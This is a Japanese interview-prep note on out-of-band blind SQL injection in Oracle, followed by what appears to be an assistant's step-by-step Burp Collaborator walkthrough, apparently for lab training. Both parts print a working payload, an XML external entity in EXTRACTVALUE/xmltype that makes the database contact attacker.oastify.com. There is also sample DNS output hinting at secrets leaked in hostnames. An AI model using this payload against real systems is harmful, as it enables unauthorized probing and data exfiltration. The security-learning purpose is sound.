## 🎯 まず一言でいうと
**アプリのレスポンスが変化しないブラインド環境でも、DB に外部通信をさせて脆弱性を証明する攻撃。  
Oracle なら XML + 外部エンティティで DNS リクエストを強制発生させる。**

---

## 🧩 どんな脆弱性か（What）
- **SQL インジェクションの一種**
- ただし **レスポンスに一切変化が出ない**タイプ  
  → 通常の Blind SQLi（Welcome back の有無など）が使えない
- 代わりに **DB に外部サーバーへ通信させる**ことで結果を観測する  
  → DNS / HTTP リクエストが来たら「SQL が実行された」と判断できる

---

## 🔍 どう気づくか（How to detect）
- 入力値を変えても **レスポンスが完全に一定**
- しかし内部で SQL が動いている可能性がある
- Oracle なら `EXTRACTVALUE` や `XMLType` が使える場合が多い
- 外部通信が許可されている環境（DNS など）があると気づく

**面接用ワンフレーズ：**  
「レスポンス差分が取れないのに SQL が動いている気配がある時、帯域外の可能性を疑います。」

---

## 💥 どう攻撃するか（Exploit）
代表的な Oracle ペイロード：

```sql
UNION SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://attacker.oastify.com/">
    %remote;
  ]>'),
  '/l'
) FROM dual--
```

攻撃の流れ：
1. 攻撃者が用意した DNS/HTTP サーバー（Collaborator）を用意
2. ペイロードを送信
3. DB が XML をパース → 外部エンティティを解決しようとする  
4. **DB が attacker.oastify.com にアクセス**  
5. そのアクセスを観測できれば「SQL が実行された」と確定

---

## 🛡️ どう対策するか（Mitigation）
- **プリペアドステートメント（バインド変数）を徹底**
- **外部ネットワークへの通信を DB から禁止**
- **XML 外部エンティティ（XXE）を無効化**
- WAF で `EXTRACTVALUE` / `XMLType` / `ENTITY` などの悪用パターンを検知
- DB のエラーメッセージ・機能を最小化

**面接用ワンフレーズ：**  
「SQLi 対策＋DB の外部通信遮断＋XML 外部エンティティ無効化の3点セットで防ぎます。」

---

## 🗣️ 30秒面接回答（完成版）
> 「これは **帯域外ブラインド SQL インジェクション**と呼ばれる脆弱性で、レスポンスに変化が出ないブラインド環境でも、DB に外部サーバーへ DNS/HTTP リクエストを送らせることで SQL が実行されたかを確認できる攻撃です。  
> 例えば Oracle では `XMLType` と外部エンティティを使って攻撃者のサーバーへアクセスさせます。  
> 気づき方としては、レスポンスが完全に一定なのに SQL が動いている気配がある場合です。  
> 対策はプリペアドステートメントの徹底、DB からの外部通信遮断、XML 外部エンティティの無効化です。」


了解。  
「**どうやって Collaborator に DNS が届くのか**」を、Burp の画面操作レベルで **実務的に・手順で・理由付きで**説明するね。  
和志さんが Pro を手に入れた瞬間に **そのまま動けるレベル**に落とし込む。

---

# 🔧 **Burp Collaborator に DNS を飛ばすまでの実際の操作**

## 🟦 **1. Burp Collaborator タブを開く**
- Burp Suite Pro を起動  
- 上部メニュー → **“Burp” → “Burp Collaborator client”**  
- これが **攻撃者側の受信サーバー**になる

📌 **ここでやることは1つだけ：サブドメインをコピーする**

---

## 🟦 **2. サブドメインをコピー**
Collaborator クライアントを開くと、最上部にこういう文字列が出る：

```
abc123xyz.oastify.com
```

これが **あなた専用の受信サーバー**  
→ DB がここにアクセスしてきたら「SQL が実行された」と確定する。

---

## 🟦 **3. ペイロードに埋め込む**
Repeater に送ったリクエストの `TrackingId` などのパラメータに、以下のように埋め込む：

```sql
UNION SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://abc123xyz.oastify.com/">
    %remote;
  ]>'),
  '/l'
) FROM dual--
```

📌 **ポイント**  
- DB が XML をパースするときに  
  → `remote` エンティティを解決しようとして  
  → **外部 URL にアクセスする**

---

## 🟦 **4. リクエスト送信（Repeater）**
Burp Repeater で **Send** を押すだけ。

レスポンスは **何も変わらない**  
→ これが「Blind（盲目）」の理由。

---

## 🟦 **5. Collaborator に戻って “Poll now” を押す**
Collaborator クライアントに戻り、右上の **“Poll now”** をクリック。

成功すると、こういうログが出る：

```
DNS interaction:
s3cr3tpass.abc123xyz.oastify.com
```

📌 **これが攻撃成功の証拠**  
- DB が外部通信した  
- つまり SQL が実行された  
- さらにパスワードなどの値が DNS 名に埋め込まれている場合もある

---

# 🎯 **なぜ DNS が届くのか（内部動作）**

1. DB が `XMLType` を処理  
2. `<!ENTITY % remote SYSTEM "http://xxxx.oastify.com/">` を解決しようとする  
3. DB が **外部 URL にアクセス**  
4. そのアクセスが **Collaborator に届く**  
5. Burp が「届いたよ」と表示する

---

# 🧩 **全体の流れ（図解）**

```
[あなた] → SQLi ペイロード → [Webサーバー] → [DB]
                                              ↓
                                   外部URLにアクセス
                                              ↓
                                   [Collaborator]
                                              ↓
                                   あなたが受信を確認
```

---

# 🗣️ **30秒で説明できる実務回答**
> 「Burp Suite Pro の Collaborator を使い、DB に外部通信をさせることで  
> レスポンスが変わらないブラインド SQLi を検出します。  
> Collaborator のサブドメインを XML 外部エンティティに埋め込み、  
> Repeater から送信すると、DB がその URL にアクセスします。  
> Collaborator の “Poll now” に DNS が届けば SQL が実行された証拠です。」

